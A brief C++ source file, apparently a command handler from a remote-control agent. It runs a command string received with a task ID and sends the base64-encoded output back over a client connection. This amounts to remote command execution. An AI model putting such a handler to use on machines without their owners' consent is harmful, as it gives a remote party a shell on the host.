#include "pch.h"
#include "../connection/client.h"
#include "exec_command.h"
#include "handlers/pipe_subprocess.h"
#include "cpp-base64/base64.h"
exec_command::exec_command(string _taskId,string command) {
	taskId = std::move(_taskId);
	this->command = command;
}
void exec_command::execute() {
	string combuffer=pipeStart(command);
	client::instance->sendPacket(response{ finished, taskId, base64_encode(combuffer) }.dump());
}